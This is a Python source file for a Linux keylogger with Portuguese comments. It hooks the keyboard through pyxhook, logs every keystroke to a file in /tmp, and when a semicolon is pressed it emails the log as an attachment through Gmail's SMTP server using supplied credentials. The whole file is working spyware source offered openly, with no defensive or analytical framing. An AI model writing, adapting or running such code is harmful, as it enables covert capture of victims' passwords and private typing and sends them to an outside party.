#lib importantes
#-*- coding: utf-8 -*-

#Copyright (C) 2008 MrTrue <gui15787@gmail.com>
#     This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>

import pyxhook
import datetime,os,sys
import argparse as args
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
from email.Utils import COMMASPACE, formatdate

#arguments
parser = args.ArgumentParser()
parser.add_argument("-e", "--email",required=True,help="Your email to send the logs")
parser.add_argument("-p", "--password",required=True,help="Your password to the program send the logs")
parser.add_argument("-l", "--local",required=False,type=str,default="/tmp/logs.txt",help="the place where do you will put the logs")

parsed_args = parser.parse_args()

data_hora = datetime.datetime.now()
data_hora = str(data_hora).split('.')[0].replace(' ','_')###
sendTo = parsed_args.email #para onde você ira enviar o arquivo
assunto = 'Keylogger %s' %data_hora
mensagem = ' the keylogger dumped it %s '%data_hora #mensagem é também pega a data é a hora do pc 
youremail =parsed_args.email
password = parsed_args.password
servidor= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros
porta = 587
log_file = parsed_args.local

#essa funão gerencia cria os heards dentre outras coisas 
def send_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[]):
  global saida
  servidor = servidor
  porta = porta
  FROM = FROM
  PASS = PASS
  TO = TO
  subject = subject
  texto = texto
  msg = MIMEMultipart()
  msg['From'] = FROM
  msg['To'] = TO
  msg['Subject'] = subject
  msg.attach(MIMEText(texto))

  for f in anexo:
    part = MIMEBase('application', 'octet-stream')
    os.chdir(r"/")
    part.set_payload(open(f, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition','attachment;filename="%s"'% os.path.basename(f))
    msg.attach(part)

  try:
    gm = smtplib.SMTP(servidor,porta)
    gm.ehlo()
    gm.starttls()
    gm.ehlo()
    gm.login(FROM, PASS)
    gm.sendmail(FROM, TO, msg.as_string())
    gm.close()

  except Exception,e:
    errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
    print('%s'%errorMsg)

def OnKeyPress(event): #essa função pega as teclas que foram precionadas
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==59: #59 se esse valor e representado por ; se for precionada ele ira parar o keylogger e ira mandar o email
    fob.close()
    new_hook.cancel()
    send_email(servidor, porta, youremail, password, sendTo, assunto, mensagem,[log_file])

new_hook = pyxhook.HookManager()
new_hook.KeyDown= OnKeyPress
new_hook.HookKeyboard()
new_hook.start()